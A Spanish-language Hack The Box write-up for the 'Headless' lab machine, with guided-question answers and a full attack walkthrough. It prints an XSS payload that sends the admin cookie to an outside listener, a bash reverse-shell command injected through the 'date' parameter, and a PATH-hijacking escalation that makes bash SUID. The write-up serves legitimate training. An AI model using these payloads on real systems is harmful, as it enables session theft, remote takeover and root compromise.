---
title: Writeup headless - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - headless
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina headless en Hack The Box.
keywords:
  - writeup headless
  - hack the box headless
  - resolución máquina headless
  - headless hack the box
  - htb headless
---
----------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Headless)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=-R48V7v7tVY)|[Parte2](https://www.youtube.com/watch?v=aEMhdjy5Txw)
- 🧠 **Explicación resumida**: 

---

#easy #linux #nmap #ping #XSS #abusobinariosyscheck #tratamientotty #export #XSS #whatweb #wappalyzer #gobuster #commandinjection #bash #sudo-l #pathhijacking #echo #nc-nlvp443 #chmod #ls-la #cd #nano 

------------
# Guided Mode

1)¿Cuál es el puerto TCP abierto más alto en la máquina de destino?
	5000

2)¿Cuál es el título de la página que aparece si el sitio detecta un ataque en el formulario de contacto con el servicio de asistencia?
	Hacking Attempt Detected

3)¿Cuál es el nombre de la cookie que se establece para un usuario que ha iniciado sesión en el sitio?
	is_admin

4)¿Cuál es la URL relativa de la página en Headless que requiere autorización para acceder?
	/dashboard

5)¿Cuál es el nombre del parámetro en las solicitudes POST a /dashboard que contiene una vulnerabilidad?
	date

6)¿Cuál es el nombre del usuario con el que se está ejecutando la aplicación web?
	dvir

*La pregunta anterior era la flag de user.txt*
8)¿Cuál es la ruta completa al script que dvir puede ejecutar como cualquier usuario sin contraseña?
	/usr/bin/syscheck bash

9)syscheck llama a otros scripts para recopilar la salida. ¿Cuál es el nombre del script al que se llama con una ruta relativa?
	initdb.sh

------------

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.8
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.8 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,5000 10.10.11.8 -oN target
```
![[Headless1.png]]
![[Headless2.png]]![[Headless3.png]]![[Headless4.png]]
*TTL:* Maquina Linux
*Puertos:*
	`22` [[ssh]]
	`5000` upnp-HTTP

------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.11.8:5000/
```

![[Headless5.png]]

![[Headless6.png]]
Wappalyzer no nos muestra nada, y whatweb nos dice que esta corriendo python, http y una cookie que es *is_admin* que nos llama la atencion

----------
# [[Gobuster]]

```shell
gobuster dir -u http://10.10.11.8:5000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 64
```

![[Headless7.png]]
Me da el directorio *dashboard* que seria http://10.10.11.8:5000/dashboard que no nos deja entrar por que no tenemos los permisos suficientes
![[Headless19.png]]

-------
# [[XSS para robar cookies]]

Entramos a la pagina web
![[Headless18.png]]
Apretamos el boton de *For questions*

Y nos envia a esta pagina que tiene un formulario de contacto
![[Headless17.png]]
Interceptamos la peticion con caido y vamos a cambiar el contenido del User-Agent y del parametro de *messege* para hacer un [[XSS para robar cookies]] y obtener la cookie de sesion de la persona que creemos que va a leer nuestro formulario

![[Headless10.png]]
Este va a ser el payload que vamos a inyectar `<img src=x onerror=fetch('http://10.10.16.15:80'+document.cookie);>`
Lo estamos colocando en User-Agent y y en parametro de messege que es el vulnerable. El primer [[XSS para robar cookies]] guarda el payload en el parametro message y despues con el payload de user agent ejecuta el *img* y el *fetch()* envia la cookie a mi server
Todo esto mientras estoy en escucha con [[python3 -m http.server]] con el comando `python3 -m http.server 80`

![[Headless9.png]]
Vemos que al enviar la peticion con payload malicioso [[XSS para robar cookies]]  recibimos la cookie del administrador que ve nuestro formulario

is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

Ahora cambiamos la cookie de sesion en el [[Caido]] y vemos que ya podemos ingresar a la pagina http://10.10.11.8:5000/dashboard

Y listo ya estamos adentro de la maquina
![[Headless20.png]]

------
# [[Command Injection]]

![[Headless11.png]]
Vemos que si ponemos un ;date nos va a ejecutar el comando que le pongamos ya que nos tira el output de [[id]]

Ahora en el parametro *date* vamos a probar mandarnos una [[Reverse shell]] mientras estamos en escucha con [[nc -nlvp 443]]

vamos a agregar ``;bash -c "bash -i >%26 /dev/tcp/10.10.16.15/443 0>%261"``

![[Headless12.png]]

![[Headless13.png]]
Y ganamos acceso a la maquina

--------
# [[Tratamiento de la TTY]]

---------
# Escalada de privilegios con [[Abuso de Sudo]] del [[Binario syscheck]] y [[Path Hijacking]]

![[Headless14.png]]
Sabemos que podemos ejecutar el binario */usr/bin/syscheck* como root sin proporcionar contraseña

Buscando en google sobre este binario y como escalar privilegios, encontramos este [post](https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913)
Y vemos que al ejecutarse el binario, necesita ejecutar el archivo *initdb.sh* asi que vamos a cambiar el PATH para cuando busque este archivo y modificar el contenido del mismo. Para esto vamos a usar la tecnica [[Path Hijacking]], usando el comando [[echo]] y [[export]]

Vamos a usar `echo $PATH` para ver nuestro PATH actual, luego lo vamos a modificar para que de primeras cuando ejecutamos un binario busque en el directorio */tmp* `export PATH= /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
![[Headless16.png]]

Ahora vamos a la carpeta *tmp* con [[cd]] usando el comando `cd /tmp`

Vamos a crear el archivo initdb.sh con [[nano]] usando el comando `nano initdb.sh` y le vamos a dar permiso de ejecucion con [[chmod]] usando le comando `chmod +x initdb.sh` 

Contenido del archivo *initdb.sh*

```sh
chmod u+s /bin/bash
```
Esto lo que va a hacer es que cuando ejecutemos el binario se va a transformar el [[SUID]] la [[bash]]

Una vez hecho esto vamos a ejecutar con [[sudo]] usando `sudo /usr/bin/syscheck` para que tenga permisos de root, y haga la bash [[SUID]] como dijimos antes. Ahora con [[ls]] usamos `ls -la /bin/bash` y vemos que aparece la *s* asi que se transformo en [[SUID]] y solo nos queda ejecutar la [[bash]] con permisos de admin que para eso usamos el comando `bash -p`
Y listo ya somos root nada mas nos queda catear las flags
![[Headless15.png]]

-------
# Notas

UPnP = sistema que abre puertos del router automáticamente para que los dispositivos puedan comunicarse mejor.

----------
# Creditos
[Writeup de fre1si](https://medium.com/@fre1si/hackthebox-headless-writeup-d7143c837ca0)